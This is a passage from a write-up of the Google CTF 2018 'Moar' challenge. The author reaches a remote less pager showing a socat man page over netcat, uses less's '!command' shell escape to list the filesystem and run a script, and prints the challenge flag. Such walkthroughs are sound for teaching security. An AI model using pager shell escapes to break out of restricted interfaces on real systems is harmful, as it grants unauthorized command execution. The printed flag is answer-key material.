# Time For Moar Google CTF 2018

[Last time](Google_CTF_2018_1.html), I explored the first five quests of Google
CTF 2018, and now, it's time for MOAR!

## Moar

The quest prompt gave a `netcat` address, let's connect and see what's over on
the other side:

```
$ nc moar.ctfcompetition.com 1337
[...]
NAME
       socat - Multipurpose relay (SOcket CAT)

SYNOPSIS
       socat [options] <address> <address>
       socat -V
       socat -h[h[h]] | -?[?[?]]
       filan
       procan
[...]
```

It is a `man` page for `socat`, over the pager `less`. Tying `q` would drop the
connection. Let's check the help page:

```
[...]
  !command             Execute the shell command with $SHELL.
  |Xcommand            Pipe file between current pos & mark X to shell command.
[...]
```

Oh, that looks interesting, let's try it:

```
$ nc moar.ctfcompetition.com 1337
! ls /
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
! ls ~
ls: cannot access '/home/unprivileged': No such file or directory
! ls /home
moar
! ls /home/moar
disable_dmz.sh
! /home/moar/disable_dmz.sh
Disabling DMZ using password CTF{SOmething-CATastr0phic}
/home/moar/disable_dmz.sh: 18: /home/moar/disable_dmz.sh: cannot create /dev/dmz: Read-only file system
```

And there is the flag.

## Admin UI


